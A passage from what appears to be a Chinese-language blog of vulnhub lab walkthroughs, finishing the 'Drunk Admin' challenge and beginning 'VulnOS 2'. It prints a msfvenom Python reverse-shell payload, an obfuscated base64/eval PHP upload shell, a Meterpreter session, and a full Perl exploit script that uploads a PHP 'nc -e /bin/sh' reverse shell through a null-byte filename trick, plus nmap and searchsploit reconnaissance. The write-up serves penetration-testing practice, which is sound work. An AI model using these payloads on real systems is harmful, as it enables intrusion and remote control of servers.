class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;form&quot; id=&quot;form&quot; method=&quot;post&quot; action=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;table&gt;  </span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">      &lt;td&gt;Secret:&lt;/td&gt;</span></span><br><span class="line"><span class="string">      &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sc&quot; size=&quot;16&quot;&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">      &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;decr&quot; value=&quot;Reveal My Secret:&quot;&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">  &lt;/table&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>猜测可能和解密有关，继续发现敏感文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/</span><br><span class="line">ls</span><br><span class="line">image.php</span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">info.php</span><br><span class="line">myphp.php</span><br><span class="line">style</span><br><span class="line">upload.php</span><br><span class="line">xmm.html</span><br><span class="line"></span><br><span class="line">ls -a </span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.htaccess</span><br><span class="line">.proof</span><br><span class="line">image.php</span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">info.php</span><br><span class="line">myphp.php</span><br><span class="line">style</span><br><span class="line">upload.php</span><br><span class="line">xmm.html</span><br><span class="line"></span><br><span class="line">cat .proof</span><br><span class="line"><span class="comment">#########################</span></span><br><span class="line"><span class="comment"># Drunk Admin Challenge #</span></span><br><span class="line"><span class="comment">#     by @anestisb      #</span></span><br><span class="line"><span class="comment">#########################</span></span><br><span class="line"></span><br><span class="line">bob&gt; Great work.</span><br><span class="line">bob&gt; Meet me there.</span><br><span class="line">...&gt; ?</span><br><span class="line">bob&gt; What? You don<span class="string">&#x27;t know where?</span></span><br><span class="line"><span class="string">bob&gt; Work a little more your post</span></span><br><span class="line"><span class="string">     exploitation skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Secret Code:</span></span><br><span class="line"><span class="string">TGglMUxecjJDSDclN1Ej</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mail me your methods at:</span></span><br><span class="line"><span class="string">anestis@bechtsoudis.com</span></span><br></pre></td></tr></table></figure>

<p>将其中的Secret Code:TGglMUxecjJDSDclN1Ej，base64解密，如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python checkifbase64.py </span></span><br><span class="line">Enter string to check <span class="keyword">if</span> base64: TGglMUxecjJDSDclN1Ej</span><br><span class="line">Lh%1L^r2CH7%7Q<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>然后将/home/bob下的public_html解密文件夹拷贝到/var/www/images文件夹下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/bob/</span><br><span class="line">cp –r public_html/ /var/www/images</span><br></pre></td></tr></table></figure>

<p>然后将之前base64解密出的Lh%1L^r2CH7%7Q#放入框中解密，得到如下坐标信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub27.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Alice, prepare <span class="keyword">for</span> a kinky night. Meet me at <span class="string">&#x27;35.517286&#x27;</span> <span class="string">&#x27;24.017637&#x27;</span></span><br></pre></td></tr></table></figure>

<p>将坐标信息放入google地图中搜索，得到如下位置信息，是希腊的某个地点</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub28.jpg"></p>
<p>到此为止，邮件已解密，挑战完成！但是还能更加深入。</p>
<h3 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h3><p>通过之前的shell，执行以下命令，将哑shell变为可视化的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub29.jpg"></p>
<p>考虑到php的限制，php的payload已经取消考虑了。这仍然留下了其他几种有效负载类型。使用python一种。 非常简单，使用msf生成python的payload木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.84.135 LPORT=6688 -f raw &gt; pload.py</span><br></pre></td></tr></table></figure>

<p>然后再编写上传页面，通过之前的方式上传此页面,因为其中有太多受限制的字符串，因此需要对base64进行了编码并以这种形式上传：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="string">&quot;512000&quot;</span> /&gt;</span><br><span class="line">    Send this file: &lt;input name=<span class="string">&quot;userfile&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Send File&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$b</span> = strrev(<span class="string">&quot;edoced_4&quot;</span> . <span class="string">&quot;6esab&quot;</span>);</span><br><span class="line"><span class="built_in">eval</span>( <span class="variable">$b</span>(<span class="string">&#x27;JHVwbG9hZGRpciA9ICcuLyc7DQokdXBsb2FkZmlsZSA9ICR1cGxvYWRkaXIgLiBiYXNlbmFtZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyduYW1lJ10pOw0KDQplY2hvICI8cD4iOw0KDQppZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VzZXJmaWxlJ11bJ3RtcF9uYW1lJ10sICR1cGxvYWRmaWxlKSkgew0KICBlY2hvICJGaWxlIGlzIHZhbGlkLCBhbmQgd2FzIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZC5cbiI7DQp9IGVsc2Ugew0KICAgZWNobyAiVXBsb2FkIGZhaWxlZCI7DQp9DQoNCmVjaG8gIjwvcD4iOw0KZWNobyAnPHByZT4nOw0KZWNobyAnSGVyZSBpcyBzb21lIG1vcmUgZGVidWdnaW5nIGluZm86JzsNCnByaW50X3IoJF9GSUxFUyk7DQpwcmludCAiPC9wcmU+Ijs=&#x27;</span>) );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到py脚本上传成功</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub30.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub31.jpg"></p>
<p>下面msf开启监听，并且执行py脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@drunkadm:/var/www/images$ ls</span><br><span class="line">ls</span><br><span class="line">30ec590e9fe5ee51c2dd36ac1bfb9c3d.jpg  aa63b1c597b45e4f1f883724d0f8dfbe.jpg</span><br><span class="line">3df5758863d650e59525cf2aa0676230.png  fa253b94faf3ccadda8719fa6ce30fb4.jpg</span><br><span class="line">60f9e780f17680102d7869842bde4050.php  index.html</span><br><span class="line">8dc053a3ed0adf03994f96347d20d9e5.png  pload.py</span><br><span class="line">a361463fc252b94026673a556a177ee7.php  public_html</span><br><span class="line">www-data@drunkadm:/var/www/images$ python pload.py</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                        </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                      </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                     </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                    </span><br><span class="line">  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                    </span><br><span class="line">  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                    </span><br><span class="line">  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                    </span><br><span class="line">  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                    </span><br><span class="line">   cOOOOOOO.   .OOc.     <span class="string">&#x27;oOO.   ,OOOOOOOc                                                     </span></span><br><span class="line"><span class="string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                      </span></span><br><span class="line"><span class="string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                       </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;                                                        </span><br><span class="line">       .dOOo   .OOOOocccxOOOO.   xOOd.                                                         </span><br><span class="line">         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                           </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.cOk:                                                             </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                               </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                 </span><br><span class="line">                 .lOOOOOOOl.                                                                   </span><br><span class="line">                    ,dOd,                                                                      </span><br><span class="line">                      .                                                                        </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.62-dev                          ]</span><br><span class="line">+ -- --=[ 1949 exploits - 1090 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> PAYLOAD python/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.84.135</span><br><span class="line">LHOST =&gt; 192.168.84.135</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 6688</span><br><span class="line">LPORT =&gt; 6688</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.84.135:6688 </span><br><span class="line">[*] Sending stage (53755 bytes) to 192.168.84.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.84.135:6688 -&gt; 192.168.84.138:47559) at 2019-12-09 03:22:32 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/images                                                                                                                                                                                                                   </span><br><span class="line">========================                                                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Mode              Size    Type  Last modified              Name                                                                                                                                                                            </span><br><span class="line">----              ----    ----  -------------              ----                                                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  143     fil   2012-03-03 02:08:18 -0500  .htaccess                                                                                                                                                                       </span><br><span class="line">100644/rw-r--r--  30099   fil   2019-12-08 21:14:52 -0500  30ec590e9fe5ee51c2dd36ac1bfb9c3d.jpg                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  166311  fil   2012-03-06 23:57:20 -0500  3df5758863d650e59525cf2aa0676230.png                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  820     fil   2019-12-09 03:03:44 -0500  60f9e780f17680102d7869842bde4050.php                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  7205    fil   2012-03-07 00:00:17 -0500  8dc053a3ed0adf03994f96347d20d9e5.png                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  820     fil   2019-12-09 03:01:30 -0500  a361463fc252b94026673a556a177ee7.php                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  21764   fil   2012-03-03 23:45:46 -0500  aa63b1c597b45e4f1f883724d0f8dfbe.jpg                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  30099   fil   2019-12-09 00:42:11 -0500  fa253b94faf3ccadda8719fa6ce30fb4.jpg                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  0       fil   2012-03-03 00:48:29 -0500  index.html                                                                                                                                                                      </span><br><span class="line">100644/rw-r--r--  454     fil   2019-12-09 03:04:56 -0500  pload.py                                                                                                                                                                        </span><br><span class="line">40755/rwxr-xr-x   4096    dir   2019-12-09 01:51:31 -0500  public_html</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2927 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">30ec590e9fe5ee51c2dd36ac1bfb9c3d.jpg  aa63b1c597b45e4f1f883724d0f8dfbe.jpg</span></span><br><span class="line"><span class="string">3df5758863d650e59525cf2aa0676230.png  fa253b94faf3ccadda8719fa6ce30fb4.jpg</span></span><br><span class="line"><span class="string">60f9e780f17680102d7869842bde4050.php  index.html</span></span><br><span class="line"><span class="string">8dc053a3ed0adf03994f96347d20d9e5.png  pload.py</span></span><br><span class="line"><span class="string">a361463fc252b94026673a556a177ee7.php  public_html</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<p>成功弹回shell</p>
<h5 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h5><p>下面再附上希腊某位大佬的傻瓜式通关脚本(.pl后缀的perl脚本)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use LWP::UserAgent;</span><br><span class="line">use Digest::MD5 qw( md5_hex );</span><br><span class="line"> </span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#  HangOver v.1 : Remote exploitation script for &quot;Drunk Admin&quot; Web Hacking Challenge.</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  WARNING : Don&#x27;t drink and code! 😉</span></span><br><span class="line"><span class="comment">#  mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#  Many thanks to Anestis Bechtsoudis (@anestisb) for this challenge.</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;+-----------------------------------+\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;| HangOver v.1 - Run(2)Shell Script |\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;+-----------------------------------+\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address of the target box (e.g.: http://192.168.178.39)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$target</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$target</span>);</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$target</span> <span class="keyword">if</span> (<span class="variable">$target</span> !~ /^http:/);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$ip</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$ip</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the port to connect back on (e.g.: 4444)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$port</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$payload</span> =</span><br><span class="line"><span class="string">&#x27;&lt;?php&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$a = &quot;nc&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$b = &quot; -e &quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$c = &quot;/bin/sh &#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$port</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$cmd = $a.$b.$c;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$dead = &quot;echo ex&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$beef = &quot;ec(\&#x27;</span><span class="string">&quot;.<span class="variable">$cmd</span> .&quot;</span>\<span class="string">&#x27;);&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$send = $dead.$beef;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;echo eval($send);&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = int(rand()*10110110).<span class="string">&quot;.jpg%00.php&quot;</span>;</span><br><span class="line">open FILE, <span class="string">&quot;&gt;<span class="variable">$filename</span>&quot;</span> or die $!;</span><br><span class="line"><span class="built_in">print</span> FILE <span class="variable">$payload</span>;</span><br><span class="line">close FILE;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+]Uploading the shell to server...\n&quot;</span>;</span><br><span class="line">system(<span class="string">&#x27;curl -s -b trypios=uploader -F image=@&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27; -F &quot;Submit=Host My Awesome Image&quot; &#x27;</span>.<span class="variable">$target</span>.<span class="string">&#x27;:8880/upload.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$md5</span> = md5_hex(<span class="string">&quot;<span class="variable">$filename</span>&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+]Check for the shell:\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="variable">$target</span>.<span class="string">&quot;:8880/images/&quot;</span>.<span class="variable">$md5</span>.<span class="string">&quot;.php\n\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[vulnos-2]</title>
    <url>/2020/04/17/vulnos-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：VulnOS: 2<br>发布日期：2016年5月17日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>VulnOSv2.7z</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TdjIuN3o=">https://download.vulnhub.com/vulnos/VulnOSv2.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TdjIuN3oudG9ycmVudA==">https://download.vulnhub.com/vulnos/VulnOSv2.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>VulnOS是打包为虚拟映像的一系列易受攻击的操作系统，以增强渗透测试技能</p>
<p>这是版本2-体积更小，混乱更少！由于时间并不总是站在我这一边，因此花了很长时间创建另一个VulnOS。但是喜欢创建它们。该映像是使用VBOX构建的。解压缩文件并将其添加到虚拟化软件中。</p>
<p>任务是渗透公司网站，获取系统root权限并得到最终的flag</p>
<p>注意：当前的键盘首选项为“pentesting是一个广泛的概念”如果有任何疑问，请随时通过<span class="exturl" data-url="bWFpbHRvOiYjeDZkOyYjeDM0OyYjMTAwOyYjeDYyOyYjNTE7JiN4MzM7JiMxMDI7JiN4NDA7JiN4Njc7JiMxMDk7JiN4NjE7JiMxMDU7JiMxMDg7JiN4MmU7JiM5OTsmIzExMTsmI3g2ZDs=">&#x6d;&#x34;&#100;&#x62;&#51;&#x33;&#102;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;<i class="fa fa-external-link-alt"></i></span>联系。向Vulnhub测试团队大声疾呼！希望你喜欢。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.104</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.56.104</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">6667/tcp open  irc     ngircd</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 22,80,6667 -sV -v -A -T4 --script=vuln 192.168.56.104</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.104</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.104:80/jabc/?q=node/6</span><br><span class="line">|     Form id: commerce-cart-add-to-cart-form-3</span><br><span class="line">|     Form action: /jabc/?q=node/6</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.104:80/jabc/?q=node/4</span><br><span class="line">|     Form id: commerce-cart-add-to-cart-form-1</span><br><span class="line">|     Form action: /jabc/?q=node/4</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.104:80/jabc/?q=node/5</span><br><span class="line">|     Form id: commerce-cart-add-to-cart-form-2</span><br><span class="line">|_    Form action: /jabc/?q=node/5</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.7 (Ubuntu)</span></span><br><span class="line"><span class="string">| http-sql-injection: </span></span><br><span class="line"><span class="string">|   Possible sqli for queries:</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dD%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dD%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_    http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">6667/tcp open  irc     ngircd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait <span class="built_in">set</span> to 100 (or higher <span class="keyword">if</span> you get this message again).</span><br></pre></td></tr></table></figure>

<p>浏览器访问80端口的website链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104/jabc/</span><br></pre></td></tr></table></figure>

<p>在此网页中，有许多选项卡，浏览了每个选项卡，包括其页面来源，除了最后一个选项卡（文档）之外，什么也没找到。</p>
<p>当查看页面源代码时，服务器上将显示一行“/jabd0cs/”。只需用guest/guest登录即可</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub267.jpg"></li>
</ul>
<p>因此，打开目录并使用guest：guest作为用户名：password登录。</p>
<p>并且有一个上载选项，但有一个限制，即只能上载.doc文件，因此它几乎没有用。</p>
<p>如果观察登录页面，则有一个cms OpenDocMan v1.2.7。此版本的opendocman容易受到攻击。</p>
<p>搜索一下可用于opendocman的漏洞利用方法。对于这种类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit OpenDocMan 1.2.7</span></span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                      |  Path</span><br><span class="line">                                                                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">OpenDocMan 1.2.7 - Multiple Vulnerabilities                                         | exploits/php/webapps/32075.txt</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

